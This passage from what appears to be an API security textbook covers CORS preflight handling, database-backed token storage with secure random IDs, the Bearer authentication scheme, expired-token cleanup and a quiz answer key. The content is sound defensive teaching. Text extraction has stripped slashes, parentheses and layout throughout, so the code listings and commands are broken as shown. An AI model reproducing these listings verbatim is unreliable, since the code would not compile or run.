tokenStore.revoke request, tokenId ;         Revoke the token.      response.status 200 ;           return new JSONObject  ;    }  Return a success  response.  Now open Main.java in your editor and add a mapping for the logout endpoint to be called for DELETE requests to the session endpoint:      post " sessions", tokenController::login ;     delete " sessions", tokenController::logout ;      The new  logout route  Calling the logout endpoint with a genuine session cookie and CSRF token results in the cookie being invalidated and subsequent requests with that cookie are rejected. In this case, Spark doesn’t even bother to delete the cookie from the browser, relying purely  on  server-side  invalidation.  Leaving  the  invalidated  cookie  on  the  browser  is harmless.   Summary  145  Answers to pop quiz questions  1 d. The protocol, hostname, and port must all exactly match. The path part of a URI is ignored by the SOP. The default port for HTTP URIs is 80 and is 443 for HTTPS.  2 e. To avoid session fixation attacks, you should invalidate any existing session  cookie after the user authenticates to ensure that a fresh session is created.  3 b. The HttpOnly attribute prevents cookies from being accessible to JavaScript. 4 a, c, e. Recall from section 4.5.1 that only the registerable domain is considered for SameSite cookies—example.com in this case. The protocol, port, and path are not significant.  5 c.  An  attacker  may  be  able  to  overwrite  the  cookie  with  a  predictable  value using XSS, or if they compromise a sub-domain of your site. Hash-based values are not in themselves any less guessable than any other value, and timing attacks can apply to any solution.  Summary   HTTP Basic authentication is awkward for web browser clients and has a poor user experience. You can use token-based authentication to provide a more nat- ural login experience for these clients.   For web-based clients served from the same site as your API, session cookies are  a simple and secure token-based authentication mechanism.   Session fixation attacks occur if the session cookie doesn’t change when a user authenticates. Make sure to always invalidate any existing session before logging the user in.   CSRF attacks can allow other sites to exploit session cookies to make requests to your API without the user’s consent. Use SameSite cookies and the hash-based double-submit cookie pattern to eliminate CSRF attacks.   Modern token-based authentication  This chapter covers  Supporting cross-domain web clients with CORS   Storing tokens using the Web Storage API  The standard Bearer HTTP authentication scheme   for tokens   Hardening database token storage  With the  addition  of  session  cookie support, the  Natter  UI has  become  a  slicker user experience, driving adoption of your platform. Marketing has bought a new domain name, nat.tr, in a doomed bid to appeal to younger users. They are insist- ing that logins should work across both the old and new domains, but your CSRF protections prevent the session cookies being used on the new domain from talking to the API on the old one. As the user base grows, you also want to expand to include mobile and desktop apps. Though cookies work great for web browser clients, they are less natural for native apps because the client typically must manage them itself. You need to move beyond cookies and consider other ways to manage token-based authentication.   In this chapter, you’ll learn about alternatives to cookies using HTML 5 Web Stor- age and the standard Bearer authentication scheme for token-based authentication.  146   Allowing cross-domain requests with CORS  147  You’ll enable cross-origin resource sharing  CORS  to allow cross-domain requests from the new site.   DEFINITION Cross-origin  resource  sharing   CORS   is  a  standard  to  allow  some cross-origin requests to be permitted by web browsers. It defines a set of headers that an API can return to tell the browser which requests should be allowed.  Because you’ll no longer be using the built-in cookie storage in Spark, you’ll develop secure token storage in the database and see how to apply modern cryptography to protect tokens from a variety of threats.   5.1  Allowing cross-domain requests with CORS To help Marketing out with the new domain name, you agree to investigate how you can let the new site communicate with the existing API. Because the new site has a dif- ferent origin, the same-origin policy  SOP  you learned about in chapter 4 throws up several problems for cookie-based authentication:   Attempting  to  send  a  login  request  from  the  new  site  is  blocked  because  the  JSON Content-Type header is disallowed by the SOP.   Even  if  you  could  send  the  request,  the  browser  will  ignore  any  Set-Cookie  headers on a cross-origin response, so the session cookie will be discarded.   You also cannot read the anti-CSRF token, so cannot make requests from the  new site even if the user is already logged in.  Moving to an alternative token storage mechanism solves only the second issue, but if you want to allow cross-origin requests to your API from browser clients, you’ll need to solve the others. The solution is the CORS standard, introduced in 2013 to allow the SOP to be relaxed for some cross-origin requests.   There are several ways to simulate cross-origin requests on your local development environment, but the simplest is to just run a second copy of the Natter API and UI on a different port.  Remember that an origin is the combination of protocol, host name, and port, so a change to any of these will cause the browser to treat it as a separate origin.  To allow this, open Main.java in your editor and add the following line to the top of the method before you create any routes to allow Spark to use a different port:     port args.length > 0 ? Integer.parseInt args[0]                           : spark.Service.SPARK_DEFAULT_PORT ;  You can now start a second copy of the Natter UI by running the following command:  mvn clean compile exec:java -Dexec.args=9999  If you now open your web browser and navigate to https:   localhost:9999 natter.html, you’ll see the familiar Natter Create Space form. Because the port is different and   148  CHAPTER 5 Modern token-based authentication  Natter API requests  violate the SOP, this  will be treated as a  separate origin by  the browser, so any attempt to create a space or login will be rejected, with a cryptic error message in the JavaScript console about being blocked by CORS policy  figure 5.1 . You can fix this by adding CORS headers to the API responses to explicitly allow some cross-origin requests.  Figure 5.1 An example of a CORS error when trying to make a cross-origin request that violates the same-origin  policy  5.1.1  Preflight requests Before  CORS,  browsers  blocked  requests  that  violated  the  SOP.  Now,  the  browser makes  a  preflight  request  to  ask  the  server  of  the  target  origin  whether  the  request should be allowed, as shown in figure 5.2.   DEFINITION A  preflight  request  occurs  when  a  browser  would  normally  block the request for violating the same-origin policy. The browser makes an HTTP OPTIONS request to the server asking if the request should be allowed. The server  can  either  deny  the  request  or  else  allow  it  with  restrictions  on  the allowed headers and methods.  The browser first makes an HTTP OPTIONS request to the target server. It includes the origin of the script making the request as the value of the Origin header, along with  some headers indicating  the  HTTP method of  the  method  that  was  requested  Access-Control-Request-Method header  and any nonstandard headers that were in the original request  Access-Control-Request-Headers .   The server responds by sending back a response with headers to indicate which cross-origin requests it  considers acceptable. If the  original  request does not match the server’s response, or the server does not send any CORS headers in the response, then the browser blocks the request. If the original request is allowed, the API can also set  CORS  headers  in  the  response  to  that  request  to  control  how  much  of  the response is revealed to the client. An API might therefore agree to allow cross-origin requests with nonstandard headers but prevent the client from reading the response.      Allowing cross-domain requests with CORS  149  Web browser  JavaScript  client  example.org  SOP + CORS  JavaScript from example.org tries to make a non-simple request to api.example.com.

Original request  api.example.com  Otherwise, the request is blocked.  api.example.com  Figure 5.2 When a script tries to make a cross-origin request that would be blocked by  the SOP, the browser makes a CORS preflight request to the target server to ask if the  request should be permitted. If the server agrees, and any conditions it specifies are  satisfied, then the browser makes the original request and lets the script see the  response. Otherwise, the browser blocks the request.   150  5.1.2  CHAPTER 5 Modern token-based authentication  CORS headers The CORS headers that the server can send in the response are summarized in table 5.1. You can learn more about CORS headers from Mozilla’s excellent article at https:   developer.mozilla.org en-US docs Web HTTP CORS.  The  Access-Control-Allow- Origin and Access-Control-Allow-Credentials headers can be sent in the response to the  preflight  request  and  in  the  response  to  the  actual  request,  whereas  the  other headers are sent only in response to the preflight request, as indicated in the second column where “Actual” means the header can be sent in response to the actual request, “Preflight” means it can be sent only in response to a preflight request, and “Both” means it can be sent on either.  Table 5.1 CORS response headers  CORS header  Response  Description  Access-Control-Allow- Origin  Both  Access-Control-Allow- Headers  Access-Control-Allow- Methods  Access-Control-Allow- Credentials  Preflight  Preflight  Both  Access-Control-Max-Age  Preflight  Access-Control-Expose- Headers  Actual  Specifies a single origin that should be allowed  access, or else the wildcard * that allows access  from any origin.  Lists the non-simple headers that can be included on  cross-origin requests to this server. The wildcard  value * can be used to allow any headers.  Lists the HTTP methods that are allowed, or the  wildcard * to allow any method.  Indicates whether the browser should include cre- dentials on the request. Credentials in this case  means browser cookies, saved HTTP Basic Digest  passwords, and TLS client certificates. If set to  true, then none of the other headers can use a  wildcard value.  Indicates the maximum number of seconds that the  browser should cache this CORS response. Brows- ers typically impose a hard-coded upper limit on this  value of around 24 hours or less  Chrome currently  limits this to just 10 minutes . This only applies to  the allowed headers and allowed methods.  Only a small set of basic headers are exposed from  the response to a cross-origin request by default.  Use this header to expose any nonstandard headers  that your API returns in responses.  TIP If  you  return  a  specific  allowed  origin  in  the  Access-Control-Allow- Origin response header, then you should also include a Vary: Origin header to ensure the browser and any network proxies only cache the response for this specific requesting origin.   5.1.3  Adding CORS headers to the Natter API  Allowing cross-domain requests with CORS  151  Because the Access-Control-Allow-Origin header allows only a single value to be speci- fied,  if  you  want  to  allow  access  from  more  than  one  origin,  then  your  API  server needs to compare the Origin header received in a request against an allowed set and, if it matches, echo the origin back in the response. If you read about Cross-Site Script- ing  XSS  and header injection attacks in chapter 2, then you may be worried about reflecting a request header back in the response. But in this case, you do so only after an  exact  comparison  with  a  list  of  trusted  origins,  which  prevents  an  attacker  from including untrusted content in that response.  Armed with your new knowledge of how CORS works, you can now add appropriate headers to ensure that the copy of the UI running on a different origin can access the API.  Because  cookies  are  considered  a  credential  by  CORS,  you  need  to  return  an Access-Control-Allow-Credentials:  true  header  from  preflight  requests;  other- wise, the browser will not send the session cookie. As mentioned in the last section, this  means  that  the API  must  return  the exact  origin  in  the  Access-Control-Allow- Origin header and cannot use any wildcards.  TIP Browsers will also ignore any Set-Cookie headers in the response to a CORS request  unless  the  response  contains  Access-Control-Allow-Credentials: true. This header must therefore be returned on responses to both preflight requests and the actual request for cookies to work. Once you move to non- cookie methods later in this chapter, you can remove these headers.  To add CORS support, you’ll implement a simple filter that lists a set of allowed ori- gins, shown in listing 5.1. For all requests, if the Origin header in the request is in the allowed list then you should set the basic Access-Control-Allow-Origin and Access- Control-Allow-Credentials  headers.  If  the  request  is  a  preflight  request,  then  the request can be terminated immediately using the Spark halt   method, because no further  processing  is  required.  Although  no  specific  status  codes  are  required  by CORS, it is recommended to return a 403 Forbidden error for preflight requests from unauthorized origins, and a 204 No Content response for successful preflight requests. You should add CORS headers for any headers and request methods that your API requires for any endpoint. As CORS responses relate to a single request, you could vary the response for each API endpoint, but this is rarely done. The Natter API sup- ports GET, POST, and DELETE requests, so you should list those. You also need to list the Authorization header for login to work, and the Content-Type and X-CSRF-Token headers for normal API calls to function.   For non-preflight requests, you can let the request proceed once you have added the  basic  CORS  response  headers.  To  add  the  CORS  filter,  navigate  to  src main  java com manning apisecurityinaction and create  a new file named CorsFilter.java in your editor. Type in the contents of listing 5.1, and click Save.      152  CHAPTER 5 Modern token-based authentication  CORS and SameSite cookies SameSite cookies, described in chapter 4, are fundamentally incompatible with CORS. If  a  cookie  is  marked  as  SameSite,  then  it  will  not  be  sent  on  cross-site  requests regardless  of  any  CORS  policy  and  the  Access-Control-Allow-Credentials  header  is ignored. An exception is made for origins that are sub-domains of the same site; for example, www.example.com can still send requests to api.example.com, but genuine cross-site requests to  different  registerable  domains  are  disallowed. If you need to allow cross-site requests with cookies, then you should not use SameSite cookies.  A complication came in October 2019, when Google announced that its Chrome web browser would start marking all cookies as SameSite=lax by default with the release of Chrome 80 in February 2020.  At the time of writing the rollout of this change has been temporarily paused due to the COVID-19 coronavirus pandemic.  If you wish to use cross-site cookies you must now explicitly opt-out of SameSite protections by adding  the  SameSite=none  and  Secure  attributes  to  those  cookies,  but  this  can cause  problems  in  some  web  browsers   see  https:  www.chromium.org updates  same-site incompatible-clients . Google, Apple, and Mozilla are all becoming more aggressive in blocking cross-site cookies to prevent tracking and other security or pri- vacy issues. It’s clear that the future of cookies will be restricted to HTTP requests within the same site and that alternative approaches, such as those discussed in the rest of this chapter, must be used for all other cases.  Listing 5.1 CORS filter  package com.manning.apisecurityinaction;  import spark.*; import java.util.*; import static spark.Spark.*;  class CorsFilter implements Filter {   private final Set  allowedOrigins;    CorsFilter Set  allowedOrigins  {     this.allowedOrigins = allowedOrigins;   }    @Override   public void handle Request request, Response response  {     var origin = request.headers "Origin" ;     if  origin != null && allowedOrigins.contains origin   {          response.header "Access-Control-Allow-Origin", origin ;         response.header "Access-Control-Allow-Credentials",                 "true" ;                                                    response.header "Vary", "Origin" ;                            }  If the origin is  allowed, then  add the basic  CORS headers  to the response.      if  isPreflightRequest request   {       if  origin == null  !allowedOrigins.contains origin   {            halt 403 ;                                                       }  If the origin  is not allowed,  then reject the  preflight request.   Allowing cross-domain requests with CORS  153        response.header "Access-Control-Allow-Headers",           "Content-Type, Authorization, X-CSRF-Token" ;       response.header "Access-Control-Allow-Methods",           "GET, POST, DELETE" ;       halt 204 ;         }   }  For permitted preflight  requests, return a 204  No Content status.    private boolean isPreflightRequest Request request  {     return "OPTIONS".equals request.requestMethod    &&                      request.headers  .contains "Access-Control-Request-Method" ;       } }  Preflight requests use the HTTP OPTIONS method and include the CORS request method header.  To enable the CORS filter, you need to add it to the main method as a Spark before   filter, so that it runs before the request is processed. CORS preflight requests should be  handled  before  your  API  requests  authentication  because  credentials  are  never sent on a preflight request, so it would always fail otherwise. Open the Main.java file in your editor  it should be right next to the new CorsFilter.java file you just created  and find the main method. Add the following call to the main method right after the rate- limiting filter that you added in chapter 3:  var rateLimiter = RateLimiter.create 2.0d ;    before  request, response  -> {                    if  !rateLimiter.tryAcquire    {                   halt 429 ;                                 } } ; before new CorsFilter Set.of "https:  localhost:9999"   ;       The existing rate- limiting filter  The new  CORS filter  This ensures the new UI server running on port 9999 can make requests to the API. If you now restart the API server on port 4567 and retry making requests from the alternative UI on port 9999, you’ll be able to login. However, if you now try to create a space, the request is rejected with a 401 response and you’ll end up back at the login page!  TIP You don’t need to list the original UI running on port 4567, because this is  served  from  the  same  origin  as  the  API  and  won’t  be  subject  to  CORS checks by the browser.   The reason why the request is blocked is due to another subtle detail when enabling CORS with cookies. In addition to the API returning Access-Control-Allow-Credentials on the response to the login request, the client also needs to tell the browser that it expects credentials on the response. Otherwise the browser will ignore the Set-Cookie header despite what the API says. To allow cookies in the response, the client must set the credentials field on the fetch request to include. Open the login.js file in your   154  CHAPTER 5 Modern token-based authentication  editor and change the fetch request in the login function to the following. Save the file and restart the UI running on port 9999 to test the changes:  fetch apiUrl + ' sessions', {     method: 'POST',     credentials: 'include',         headers: {         'Content-Type': 'application json',         'Authorization': credentials     } }   Set the credentials field to  “include” to allow the API to  set cookies on the response.  If you now log in again and repeat the request to create a space, it will succeed because the cookie and CSRF token are finally present on the request.  Pop quiz 1 Given  a  single-page  app  running  at  https:   www.example.com app  and  a  cookie- based API login endpoint at https:   api.example.net login, what CORS headers in addition to Access-Control-Allow-Origin are required to allow the cookie to be remembered by the browser and sent on subsequent API requests? a Access-Control-Allow-Credentials: true only on the actual response. b Access-Control-Expose-Headers: Set-Cookie on the actual response. c Access-Control-Allow-Credentials: true only on the preflight response. d Access-Control-Expose-Headers: Set-Cookie on the preflight response. e Access-Control-Allow-Credentials:  true  on  the  preflight  response  and  Access-Control-Allow-Credentials: true on the actual response.  The answer is at the end of the chapter.  5.2  Tokens without cookies With a bit of hard work on CORS, you’ve managed to get cookies working from the new site. Something tells you that the extra work you needed to do just to get cook- ies to work is a bad sign. You’d like to mark your cookies as SameSite as a defense in depth  against  CSRF  attacks,  but  SameSite  cookies  are  incompatible  with  CORS. Apple’s Safari browser is also aggressively blocking cookies on some cross-site requests for  privacy  reasons,  and  some  users  are  doing  this  manually  through  browser  set- tings and extensions. So, while cookies are still a viable and simple solution for web clients  on  the  same  domain  as  your  API,  the  future  looks  bleak  for  cookies  with cross-origin clients. You can future-proof your API by moving to an alternative token storage format.   Cookies are such a compelling option for web-based clients because they provide the three components needed to implement token-based authentication in a neat pre- packaged bundle  figure 5.3 :   Tokens without cookies  155   A standard way to communicate tokens between the client and the server, in the form of the Cookie and Set-Cookie headers. Browsers will handle these headers for your clients automatically, and make sure they are only sent to the correct site.  A convenient storage location for tokens on the client, that persists across page loads  and reloads  and redirections. Cookies can also survive a browser restart and  can  even  be  automatically  shared  between  devices,  such  as  with  Apple’s Handoff functionality.1   Simple and robust server-side storage of token state, as most web frameworks  support cookie storage out of the box just like Spark.  Cookies are communicated between client and server using standard headers.  Cookie  Request  Set-Cookie  Web browser client  API server  Token store  Cookie jar  Response  Web browsers store cookies automatically in a cookie jar.  Server frameworks automatically persist cookie state in a backend store.  Figure 5.3 Cookies provide the three key components of token-based authentication:  client-side token storage, server-side state, and a standard way to communicate cookies  between the client and server with the Set-Cookie and Cookie headers.  To  replace  cookies,  you’ll  therefore  need  a  replacement  for  each  of  these  three aspects, which is what this chapter is all about. On the other hand, cookies come with unique problems such as CSRF attacks that are often eliminated by moving to an alter- native scheme.  5.2.1  Storing token state in a database Now  that  you’ve  abandoned  cookies,  you  also  lose  the  simple  server-side  storage implemented by Spark and other frameworks. The first task then is to implement a replacement.  In  this  section,  you’ll  implement  a  DatabaseTokenStore  that  stores token state in a new database table in the existing SQL database.  1 https:  support.apple.com en-gb guide mac-help mchl732d3c0a mac   156  CHAPTER 5 Modern token-based authentication  Alternative token storage databases Although the SQL database storage used in this chapter is adequate for demonstration purposes and low-traffic APIs, a relational database may not be a perfect choice for all deployments. Authentication tokens are validated on every request, so the cost of a database transaction for every lookup can soon add up. On the other hand, tokens are usually extremely simple in structure, so they don’t need a complicated database schema or sophisticated integrity constraints. At the same time, token state rarely changes after a token has been issued, and a fresh token should be generated when- ever  any  security-sensitive  attributes  change to  avoid  session  fixation  attacks.  This means that many uses of tokens are also largely unaffected by consistency worries.   For these reasons, many production implementations of token storage opt for non- relational database backends, such as the Redis in-memory key-value store  https:   redis.io , or a NoSQL JSON store that emphasizes speed and availability.  Whichever database backend you choose, you should ensure that it respects consis- tency in one crucial aspect: token deletion. If a token is deleted due to a suspected security breach, it should not come back to life later due to a glitch in the database. The Jepsen project  https:  jepsen.io analyses  provides detailed analysis and test- ing of the consistency properties of many databases.  A token is a simple data structure that should be independent of dependencies on other functionality in your API. Each token has a token ID and a set of attributes asso- ciated with it, including the username of the authenticated user and the expiry time of the token. A single table is enough to store this structure, as shown in listing 5.2. The  token  ID,  username,  and  expiry  are  represented  as  individual  columns  so  that they can be indexed and searched, but any remaining attributes are stored as a JSON object  serialized  into  a  string   varchar   column.  If  you  needed  to  lookup  tokens based on other attributes, you could extract the attributes into a separate table, but in most cases this extra complexity is not justified. Open the schema.sql file in your edi- tor and add the table definition to the bottom. Be sure to also grant appropriate per- missions to the Natter database user.  Listing 5.2 The token database schema  CREATE TABLE tokens      token_id VARCHAR 100  PRIMARY KEY,     user_id VARCHAR 30  NOT NULL,           expiry TIMESTAMP NOT NULL,     attributes VARCHAR 4096  NOT NULL       ; GRANT SELECT, INSERT, DELETE ON tokens TO natter_api_user;      Link the token to  the ID of the user.  Store the attributes  as a JSON string.  Grant permissions to the Natter database user.  With the database schema created, you can now implement the DatabaseTokenStore to use it. The first thing you need to do when issuing a new token is to generate a fresh token ID. You shouldn’t use a normal database sequence for this, because token IDs   Tokens without cookies  157  must  be  unguessable  for  an  attacker.  Otherwise  an  attacker  can  simply  wait  for another user to login and then guess the ID of their token to hijack their session. IDs generated by database sequences tend to be extremely predictable, often just a simple incrementing integer value. To be secure, a token ID should be generated with a high degree of entropy from a cryptographically-secure random number generator  RNG . In Java, this means the random data should come from a SecureRandom object. In other languages  you  should  read  the  data  from   dev urandom   on  Linux   or  from  an appropriate operating system call such as getrandom 2  on Linux or RtlGenRandom   on Windows.  DEFINITION In information security, entropy is a measure of how likely it is that a random variable has a given value. When a variable is said to have 128 bits of entropy, that means that there is a 1 in 2128 chance of it having one specific value rather than any other value. The more entropy a variable has, the more difficult it is to guess what value it has. For long-lived values that should be un- guessable by an adversary with access to large amounts of computing power, an entropy  of  128  bits is a  secure  minimum. If  your  API issues a  very large number of tokens with long expiry times, then you should consider a higher entropy of 160 bits or more. For short-lived tokens and an API with rate-limiting on token validation requests, you could reduce the entropy to reduce the token size, but this is rarely worth it.  What if I run out of entropy? It is a persistent myth that operating systems can somehow run out of entropy if you read too much from the random device. This often leads developers to come up with elaborate and unnecessary workarounds. In the worst cases, these workarounds dramatically  reduce  the  entropy,  making  token  IDs  predictable.  Generating  cryp- tographically-secure random data is a complex topic and not something you should attempt to do yourself. Once the operating system has gathered around 256 bits of random data, from interrupt timings and other low-level observations of the system, it can happily generate strongly unpredictable data until the heat death of the uni- verse. There are two general exceptions to this rule:   When  the  operating  system  first  starts,  it  may  not  have  gathered  enough entropy and so values may be temporarily predictable. This is generally only a concern to kernel-level services that run very early in the boot sequence. The Linux getrandom   system call will block in this case until the OS has gath- ered enough entropy.   When a virtual machine is repeatedly resumed from a snapshot it will have identical internal state until the OS re-seeds the random data generator. In some cases, this may result in identical or very similar output from the ran- dom device for a short time. While a genuine problem, you are unlikely to do a better job than the OS at detecting or handling this situation.  In short, trust the OS because most OS random data generators are well-designed and do a good job of generating unpredictable output. You should avoid the  dev    158  CHAPTER 5 Modern token-based authentication   continued  random device on Linux because it doesn’t generate better quality output than  dev  urandom and may block your process for long periods of time. If you want to learn more about how operating systems generate random data securely, see chapter 9 of Cryptography Engineering by Niels Ferguson, Bruce Schneier, and Tadayoshi Kohno  Wiley, 2010 .  For Natter, you’ll use 160-bit token IDs generated with a SecureRandom object. First, generate  20  bytes  of  random  data  using  the  nextBytes    method.  Then  you  can base64url-encode that to produce an URL-safe random string:      private String randomId   {         var bytes = new byte[20];                      new SecureRandom  .nextBytes bytes ;           return Base64url.encode bytes ;         }  Generate 20 bytes of random  data from SecureRandom.  Encode the result with URL-safe  Base64 encoding to create a string.  Listing 5.3 shows the complete DatabaseTokenStore implementation. After creating a random ID, you can serialize the token attributes into JSON and then insert the data into the  tokens table using the Dalesbred library introduced in chapter 2. Reading the token is also simple using a Dalesbred query. A helper method can be used to con- vert the JSON attributes back into a map to create the Token object. Dalesbred will call  the  method  for  the  matching  row   if  one  exists ,  which  can  then  perform  the JSON conversion to construct the real token. To revoke a token on logout, you can simply  delete  it  from  the  database.  Navigate  to  src main java com manning api- securityinaction token and create a new file named DatabaseTokenStore.java. Type in the contents of listing 5.3 and save the new file.

All that remains is to plug in the DatabaseTokenStore in place of the CookieToken- Store.  Open  Main.java  in  your  editor  and  locate  the  lines  that  create  the  Cookie- TokenStore. Replace them with code to create the  DatabaseTokenStore, passing in the Dalesbred Database object:  var databaseTokenStore = new DatabaseTokenStore database ; TokenStore tokenStore = databaseTokenStore; var tokenController = new TokenController tokenStore ;   160  CHAPTER 5 Modern token-based authentication  Save the file and restart the API to see the new token storage format at work.   TIP To  ensure  that  Java  uses  the  non-blocking   dev urandom  device  for seeding the SecureRandom class, pass the option -Djava.security.egd=file:  dev urandom  to  the  JVM.  This  can  also  be  configured  in  the  java.security properties file in your Java installation.  First create a test user, as always:  curl -H 'Content-Type: application json' \   -d '{"username":"test","password":"password"}' \   https:  localhost:4567 users  Then call the login endpoint to obtain a session token:  $ curl -i -H 'Content-Type: application json' -u test:password \    -X POST https:  localhost:4567 sessions HTTP 1.1 201 Created Date: Wed, 22 May 2019 15:35:50 GMT Content-Type: application json X-Content-Type-Options: nosniff X-XSS-Protection: 1; mode=block Cache-Control: private, max-age=0 Server:  Transfer-Encoding: chunked  {"token":"QDAmQ9TStkDCpVK5A9kFowtYn2k"}  5.2.2  Note the lack of a Set-Cookie header in the response. There is just the new token in the JSON body. One quirk is that the only way to pass the token back to the API is via the old X-CSRF-Token header you added for cookies:  $ curl -i -H 'Content-Type: application json' \   -H 'X-CSRF-Token: QDAmQ9TStkDCpVK5A9kFowtYn2k' \     -d '{"name":"test","owner":"test"}' \   https:  localhost:4567 spaces HTTP 1.1 201 Created  Pass the token in the  X-CSRF-Token header to  check that it is working.  We’ll fix that in the next section so that the token is passed in a more appropriate header.  The Bearer authentication scheme Passing  the  token  in  a  X-CSRF-Token  header  is  less  than  ideal  for  tokens  that  have nothing to do with CSRF. You could just rename the header, and that would be per- fectly acceptable. However, a standard way to pass non-cookie-based tokens to an API exists in the form of the Bearer token scheme for HTTP authentication defined by RFC 6750   https:  tools.ietf.org html rfc6750 .  While  originally  designed  for  OAuth2 usage  chapter 7 , the scheme has been widely adopted as a general mechanism for API token-based authentication.  DEFINITION A  bearer  token  is  a  token  that  can  be  used  at  an  API  simply  by including it in the request. Any client that has a valid token is authorized to   Tokens without cookies  161  use that token and does not need to supply any further proof of authentication. A  bearer  token  can  be  given  to  a  third  party  to  grant  them  access  without revealing user credentials but can also be used easily by attackers if stolen.  To send a token to an API using the Bearer scheme, you simply include it in an Autho- rization  header,  much  like  you  did  with  the  encoded  username  and  password  for HTTP Basic authentication. The token is included without additional encoding:2  Authorization: Bearer QDAmQ9TStkDCpVK5A9kFowtYn2k  The standard also describes how to issue a  WWW-Authenticate challenge header for bearer tokens, which allows our API to become compliant with the HTTP specifica- tions once again, because you removed that header in chapter 4. The challenge can include  a  realm  parameter,  just  like  any  other  HTTP  authentication scheme,  if  the API requires different tokens for different endpoints. For example, you might return realm="users" from one endpoint and realm="admins" from another, to indicate to the client that they should obtain a token from a different login endpoint for adminis- trators compared to regular users. Finally, you can also return a standard error code and description  to  tell  the  client  why  the  request  was  rejected.  Of  the  three  error  codes defined  in  the  specification,  the  only  one  you  need  to  worry  about  now  is  invalid_ token, which indicates that the token passed in the request was expired or otherwise invalid. For example, if a client passed a token that has expired you could return:  HTTP 1.1 401 Unauthorized WWW-Authenticate: Bearer realm="users", error="invalid_token",         error_description="Token has expired"  This lets the client know to reauthenticate to get a new token and then try its request again. Open the TokenController.java file in your editor and update the validate- Token and logout methods to extract the token from the Authorization header. If the value starts with the string "Bearer" followed by a single space, then you can extract the  token  ID  from  the  rest  of  the  value.  Otherwise  you  should  ignore  it,  to  allow HTTP Basic authentication to still work at the login endpoint. You can also return a useful  WWW-Authenticate  header  if  the  token  has  expired.  Listing  5.4  shows  the updated methods. Update the implementation and save the file.  Listing 5.4 Parsing Bearer Authorization headers  public void validateToken Request request, Response response  {     var tokenId = request.headers "Authorization" ;                  if  tokenId == null  !tokenId.startsWith "Bearer "   {             return;     }     tokenId = tokenId.substring 7 ;       The token ID is the rest  of the header value.  Check that the  Authorization  header is present  and uses the  Bearer scheme.  2 The syntax of the Bearer scheme allows tokens that are Base64-encoded, which is sufficient for most token  formats in common use. It doesn’t say how to encode tokens that do not conform to this syntax.   162  CHAPTER 5 Modern token-based authentication      tokenStore.read request, tokenId .ifPresent token -> {         if  Instant.now  .isBefore token.expiry   {             request.attribute "subject", token.username ;             token.attributes.forEach request::attribute ;         } else {             response.header "WWW-Authenticate",                                    "Bearer error=\"invalid_token\"," +                                   "error_description=\"Expired\"" ;       halt 401 ;         }     } ; } public JSONObject logout Request request, Response response  {     var tokenId = request.headers "Authorization" ;                  if  tokenId == null  !tokenId.startsWith "Bearer "   {             throw new IllegalArgumentException "missing token header" ;     }     tokenId = tokenId.substring 7 ;      The token ID is the rest  of the header value.      tokenStore.revoke request, tokenId ;  If the token is expired,  then tell the client using  a standard response.  Check that the  Authorization  header is present  and uses the  Bearer scheme.      response.status 200 ;     return new JSONObject  ; }  You can also add the WWW-Authenticate header challenge when no valid credentials are  present  on  a  request  at  all.  Open  the  UserController.java  file  and  update  the requireAuthentication filter to match listing 5.5.  Listing 5.5 Prompting for Bearer authentication  public void requireAuthentication Request request, Response response  {     if  request.attribute "subject"  == null  {         response.header "WWW-Authenticate", "Bearer" ;            halt 401 ;     } }  Prompt for Bearer authentication if no credentials are present.  5.2.3 Deleting expired tokens  The  new  token-based  authentication  method  is  working  well  for  your  mobile  and desktop  apps,  but  your  database  administrators  are  worried  that  the  tokens  table keeps  growing  larger  without  any  tokens  ever  being  removed.  This  also  creates  a potential  DoS  attack  vector,  because  an  attacker  could  keep  logging  in  to  generate enough tokens to fill the database storage. You should implement a periodic task to delete expired tokens to prevent the database growing too large. This is a one-line task in SQL, as shown in listing 5.6. Open DatabaseTokenStore.java and add the method in the listing to implement expired token deletion.        Tokens without cookies  163  Listing 5.6 Deleting expired tokens  Delete all tokens with an public void deleteExpiredTokens   { expiry time in the past.     database.update          "DELETE FROM tokens WHERE expiry < current_timestamp" ;      }  To make this efficient, you should index the expiry column on the database, so that it does not need to loop through every single token to find the ones that have expired. Open schema.sql and add the following line to the bottom to create the index:  CREATE INDEX expired_token_idx ON tokens expiry ;  Finally, you need to schedule a periodic task to call the method to delete the expired tokens.  There  are  many  ways  you  could  do  this  in  production.  Some  frameworks include  a  scheduler  for  these  kinds  of  tasks,  or  you  could  expose  the  method  as  a REST endpoint and call it periodically from an external job. If you do this, remember to apply rate-limiting to that endpoint or require authentication  or a special permis- sion  before it can be called, as in the following example:  before " expired_tokens", userController::requireAuthentication ; delete " expired_tokens",  request, response  -> {     databaseTokenStore.deleteExpiredTokens  ;     return new JSONObject  ; } ;  For now, you can use a simple Java scheduled executor service to periodically call the method. Open DatabaseTokenStore.java again, and add the following lines to the constructor:   Executors.newSingleThreadScheduledExecutor            .scheduleAtFixedRate this::deleteExpiredTokens,                  10, 10, TimeUnit.MINUTES ;  This will cause the method to be executed every 10 minutes, after an initial 10-minute delay. If a cleanup job takes more than 10 minutes to run, then the next run will be scheduled immediately after it completes.  5.2.4  Storing tokens in Web Storage Now that you’ve got tokens working without cookies, you can update the Natter UI to send the token in the Authorization header instead of in the X-CSRF-Token header. Open natter.js in your editor and update the createSpace function to pass the token in the correct header. You can also remove the credentials field, because you no lon- ger need the browser to send cookies in the request:      fetch apiUrl + ' spaces', {         method: 'POST',                     body: JSON.stringify data ,  Remove the credentials  field to stop the browser  sending cookies.   164  CHAPTER 5 Modern token-based authentication          headers: {             'Content-Type': 'application json',             'Authorization': 'Bearer ' + csrfToken             }     }   Pass the token in the  Authorization field using  the Bearer scheme.  Of course, you can also rename the csrfToken variable to just token now if you like. Save the file and restart the API and the duplicate UI on port 9999. Both copies of the UI will now work fine with no session cookie. Of course, there is still one cookie left to hold the token between the login page and the natter page, but you can get rid of that now too.   Until the release of HTML 5, there were very few alternatives to cookies for storing  tokens in a web browser client. Now there are two widely-supported alternatives:   The  Web  Storage  API  that  includes  the  localStorage  and  sessionStorage  objects for storing simple key-value pairs.   The IndexedDB API that allows storing larger amounts of data in a more sophisti-  cated JSON NoSQL database.  Both APIs provide significantly greater storage capacity than cookies, which are typi- cally  limited  to  just  4KB  of  storage  for  all  cookies  for  a  single  domain.  However, because session tokens are relatively small, you can stick to the simpler Web Storage API in this chapter. While IndexedDB has even larger storage limits than Web Storage, it typically requires explicit user consent before it can be used. By replacing cookies for  storage  on  the  client,  you  will  now  have  a  replacement  for  all  three  aspects  of token-based authentication provided by cookies, as shown in figure 5.4:   On the backend, you can manually store cookie state in a database to replace  the cookie storage provided by most web frameworks.   You can use the Bearer authentication scheme as a 